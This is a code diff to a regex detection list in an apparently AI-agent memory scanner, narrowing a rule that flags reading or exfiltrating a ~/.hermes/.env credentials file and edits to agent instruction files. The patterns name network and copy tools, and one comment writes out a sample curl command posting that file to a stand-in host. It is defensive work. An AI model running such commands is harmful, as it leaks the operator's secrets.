@@ -87,7 +87,18 @@ _PATTERNS: list[tuple[str, str, str]] = [
     (r'(?:\b(?:echo|cat|cp|mv|dd|tee|install|printf|rsync|scp|ln|append|add|write'
      r'|sed|chmod|chown|truncate|rm|touch|curl|wget|git)\b|\bopen\s*\(|>>?)'
      r'[^\n]{0,512}(?:\$HOME/\.ssh|~/\.ssh)', "ssh_access", "strict"),
-    (r'\$HOME/\.hermes/\.env|\~/\.hermes/\.env', "hermes_env", "strict"),
+    # Action-anchored like ssh_access / *_config_mod: a BARE path match blocked operator notes that
+    # merely say where credentials live ("Bitwarden env values in ~/.hermes/.env are quoted") — at
+    # write time that silently discarded the whole all-or-nothing memory batch, and at load time it
+    # [BLOCKED:]-replaced a benign entry. Naming the file is safe; acting on it is not. The second
+    # alternative covers transfer tools, whose URLs/flags sit between the verb and the path where the
+    # word-only filler cannot reach (`curl https://x -d @$HOME/.hermes/.env`). read_secrets /
+    # exfil_curl / exfil_wget above still catch the command shape regardless of path.
+    (rf'\b(?:read|cat|print|show|display|dump|exfiltrate|send|post|upload|copy|leak|reveal|output'
+     rf'|source|grep|base64|xxd)\s+{_FILLER}(?:\$HOME|~)/\.hermes/\.env',
+     "hermes_env", "strict"),
+    (r'\b(?:curl|wget|scp|rsync|nc|netcat|cp|mv|tar|zip)\b[^\n]{0,2048}(?:\$HOME|~)/\.hermes/\.env',
+     "hermes_env", "strict"),
     (rf'{_MODIFY}(?:AGENTS\.md|CLAUDE\.md|\.cursorrules|\.clinerules)', "agent_config_mod", "strict"),
     (rf'{_MODIFY}\.hermes/(config\.yaml|SOUL\.md)', "hermes_config_mod", "strict"),
 
